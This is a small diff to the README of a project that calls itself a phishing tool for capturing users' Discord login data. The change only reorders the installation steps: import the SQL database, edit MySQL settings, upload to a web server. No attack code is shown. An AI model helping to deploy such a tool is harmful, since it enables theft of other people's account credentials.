@@ -6,8 +6,8 @@ This is a phishing tool get user's discord login data.
 # Installation Guide
 
 1. Downlaod
-2. Edit MySQL Data in mysql.php
-3. Import sql.sql in your Database
+2. Import sql.sql in your Database
+3. Edit MySQL Data in mysql.php
 4. Upload Project to Webserver
 
 # Notice
